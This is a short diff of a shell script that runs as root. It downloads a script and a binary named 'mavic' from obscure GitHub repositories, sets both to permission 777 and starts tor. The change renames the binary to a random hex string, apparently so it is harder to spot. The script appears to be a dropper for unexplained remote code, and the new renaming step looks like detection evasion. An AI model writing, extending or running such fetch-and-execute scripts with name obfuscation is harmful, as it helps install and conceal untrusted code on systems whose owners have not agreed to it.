@@ -17,6 +17,7 @@
         l2=$(openssl rand -hex 6)
         h3=$(openssl rand -hex 6)
         l3=$(openssl rand -hex 6)
+        mav=$(openssl rand -hex 5)
         
         cd /root
         mkdir $fol
@@ -37,7 +38,8 @@
         
         wget https://github.com/unmsjd28/hjs839/raw/main/pwsh.sh
         wget https://github.com/unmsjd28/ynsg7s9/raw/main/mavic
-        chmod 777 mavic
+        mv mavic $mav
+        chmod 777 $mav
         chmod 777 pwsh.sh
         service tor start
         
